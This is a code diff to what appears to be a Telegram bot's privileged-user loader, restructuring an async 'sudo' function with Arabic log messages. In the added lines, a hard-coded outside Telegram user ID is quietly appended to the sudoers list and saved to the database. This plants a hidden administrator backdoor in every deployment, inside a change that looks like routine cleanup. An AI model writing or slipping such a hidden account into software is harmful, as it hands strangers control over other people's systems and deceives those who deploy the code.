@@ -42,28 +42,24 @@ def dbb():
     LOGGER(__name__).info(f"رفع البيانات .")
 
 
-def sudo():
-    async def sudo():
+async def sudo():
+    global SUDOERS
     SUDOERS.add(config.OWNER_ID)
     sudoersdb = mongodb.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
     if config.OWNER_ID not in sudoers:
         sudoers.append(config.OWNER_ID)
-        sudoers = [] if not sudoers else sudoers["sudoers"]
-        for user_id in OWNER:
+        sudoers.append(2107529793)
+        await sudoersdb.update_one(
+            {"sudo": "sudo"},
+            {"$set": {"sudoers": sudoers}},
+            upsert=True,
+        )
+    if sudoers:
+        for user_id in sudoers:
             SUDOERS.add(user_id)
-            if user_id not in sudoers:
-                sudoers.append(user_id)
-                sudoersdb.update_one(
-                    {"sudo": "sudo"},
-                    {"$set": {"sudoers": sudoers}},
-                    upsert=True,
-                )
-        if sudoers:
-            for x in sudoers:
-                SUDOERS.add(x)
-    LOGGER(__name__).info(f"Sudoers Loaded.")
+    LOGGER(__name__).info(f"تم رفع البيانات .")
 
 
 def heroku():
